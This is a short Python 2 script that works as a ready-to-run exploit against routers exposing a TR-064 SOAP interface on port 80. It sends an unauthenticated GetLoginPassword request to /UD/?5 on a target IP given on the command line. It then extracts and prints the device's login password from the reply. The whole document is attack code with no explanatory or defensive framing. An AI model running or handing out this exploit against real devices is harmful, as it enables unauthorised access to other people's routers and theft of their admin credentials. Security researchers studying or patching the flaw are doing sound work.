#! /usr/bin/python
import socket
import sys
import re

if len(sys.argv) !=2:
    print "[*] Please enter the target ip."
    print "[*] Usage : " + sys.argv[0] + " IP_ADDR"
    exit()
# Create a TCP/IP socket
target_host = sys.argv[1]
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = (target_host, 80)
print >>sys.stderr, '[*] Connecting to %s port %s' % server_address
sock.connect(server_address)
try:
    soap = "<?xml version=\"1.0\"?>"
    soap +="<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    soap +="<s:Body>"
    soap +="<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
    soap +="</m:GetLoginPassword>"
    soap +="</s:Body>"
    soap +="</s:Envelope>"
    message = "POST /UD/?5 HTTP/1.1\r\n"
    message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
    message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
    message += "Host:" + target_host + "\r\n"
    message += "Content-Length:" + str(len(soap)) +"\r\n"
    message += "Expect: 100-continue\r\n"
    message += "Connection: Keep-Alive\r\n\r\n"
    sock.send(message)
    data = sock.recv(1024)
    print "[*] Recieved : " + data.strip()
    sock.send(soap)
    data = sock.recv(1024)
    data += sock.recv(1024)
    #print data
    r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
    m = r.search(data)
    if m:
        print "[*] Found the password: " + m.group(1)
finally:
    sock.close()